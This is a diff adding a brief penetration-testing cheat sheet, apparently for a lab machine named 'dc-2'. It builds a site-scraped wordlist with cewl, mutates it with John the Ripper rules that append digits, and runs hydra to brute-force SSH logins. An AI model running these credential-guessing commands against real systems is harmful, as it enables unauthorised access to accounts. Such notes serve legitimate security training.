@@ -1,0 +1,26 @@
+[Useful for dealing with Authentication]
+cewl $URL -m 5 -w $PWD/cewl.txt 2>/dev/null
+FOR EXAMPLE: cewl http://dc-2:80/ -m 5 -w $PWD/cewl.txt 2>/dev/null
+
+You would then use a hydra command syntax like:
+
+hydra -L user -P cewl.txt ssh://192.168.1.131
+================================================
+
+#Nano /etc/john/john.conf --> paste the below underneath wordlists=
+# crack -> cracked, crack -> cracking
+-[:c] <* >2 !?A \p1[lc] M [PI] Q
+# Try the second half of split passwords
+-s x**
+-s-c x** M l Q
+# Add one number to the end of each password
+$[0-9]
+# Add two numbers to the end of each password
+$[0-9]$[0-9]
+# Add three numbers to the end of each password
+$[0-9]$[0-9]$[0-9]
+# Add four numbers to the end of each password
+$[0-9]$[0-9]$[0-9]$[0-9]
+
+john --wordlist=cewl.txt --rules --stdout > cewl-mutated.txt
+===============================================
